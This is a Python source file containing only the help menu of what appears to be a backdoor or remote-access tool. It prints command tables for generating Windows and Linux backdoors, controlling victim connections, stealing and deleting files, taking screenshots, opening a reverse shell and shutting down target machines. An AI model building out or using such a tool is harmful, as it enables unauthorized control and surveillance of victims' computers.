from tabulate import tabulate


def help_menu(command=''):
    if command == 'help_shell':
        print('''
Command    Description
-------    -----------
help       Print this message.
generate   Generate a Windows or linux backdoor.
set        Set parameters such as host and port.
listen     Start listen for incoming connections.
list       list active or all connections.
select     Gain control to an active connections.
close      Close all or a single active connection.
clear      Clear the screen.
qs         Quit the server only.
q!         Quit the server and all the active clients.''')
    elif command == 'help_session':
        print('''
Command            Description
-------            -----------
cwd                Get the current working directory.
ls                 list a directory or all users in the target machine.
dwnld              Download a file from the target machine.
upld               Upload a file to the target machine.
chdir              Change directory.
rmv                Delete a file from the target machine.
rmv_dir            Delete a full/empty directory from the target machine.
opn_url            Open a URL or link in the target machine.
strt_proc          Start a process (file or executable) in the target machine.
curr_usr           Get current user's Username.
chk_admin          Check if the current user is admin.
curr_usr_details   Get the current user's details.
usr_details        Get a specified user's details.
take_ss            Take and save a screenshot of the target machine.
getshell           Get/gain a reverse shell of the target machine.
logout             Logout the current user.
restrt             Restart the target machine.
shut               Shutdown the target machine.
clear              Clear the screen.
exit               Exit the current active session.''')
    else:
        print()
        print("Invalid command!")
        print(f"'{command}' isn't recognised as an internal or external command\n")
        print("Enter 'help' to view all the commands and their functions")
